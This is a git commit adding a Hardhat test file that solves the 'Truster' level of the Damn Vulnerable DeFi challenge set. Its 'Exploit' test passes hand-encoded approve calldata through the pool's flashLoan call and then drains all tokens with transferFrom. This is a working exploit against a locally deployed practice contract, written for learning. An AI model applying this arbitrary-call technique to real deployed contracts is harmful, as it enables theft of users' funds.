a08ae98a0e42f0ec2a22208d230a48038df5a07b
teberr <43701168+teberr@users.noreply.github.com>
2022-10-22 12:41:38 +0000

    Add files via upload

---
+++ blockchain/Damn Vulnerable Defi/Truster/truster.challenge.js
@@ -0,0 +1,52 @@
+const { ethers } = require('hardhat');
+const { expect } = require('chai');
+
+describe('[Challenge] Truster', function () {
+    let deployer, attacker;
+
+    const TOKENS_IN_POOL = ethers.utils.parseEther('1000000');
+
+    before(async function () {
+        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
+        [deployer, attacker] = await ethers.getSigners();
+
+        const DamnValuableToken = await ethers.getContractFactory('DamnValuableToken', deployer);
+        const TrusterLenderPool = await ethers.getContractFactory('TrusterLenderPool', deployer);
+
+        this.token = await DamnValuableToken.deploy();
+        this.pool = await TrusterLenderPool.deploy(this.token.address);
+
+        await this.token.transfer(this.pool.address, TOKENS_IN_POOL);
+
+        expect(
+            await this.token.balanceOf(this.pool.address)
+        ).to.equal(TOKENS_IN_POOL);
+
+        expect(
+            await this.token.balanceOf(attacker.address)
+        ).to.equal('0');
+    });
+
+    it('Exploit', async function () {
+        await this.pool.flashLoan(
+            0,
+            attacker.address,
+            this.token.address,
+            '0x095ea7b3000000000000000000000000'+attacker.address.slice(2) + '00000000000000000000000000000000000000000000D3C21BCECCEDA1000000'
+            )
+        await this.token.connect(attacker).transferFrom(this.pool.address, attacker.address ,TOKENS_IN_POOL)
+    });
+
+    after(async function () {
+        /** SUCCESS CONDITIONS */
+
+        // Attacker has taken all tokens from the pool
+        expect(
+            await this.token.balanceOf(attacker.address)
+        ).to.equal(TOKENS_IN_POOL);
+        expect(
+            await this.token.balanceOf(this.pool.address)
+        ).to.equal('0');
+    });
+});
+
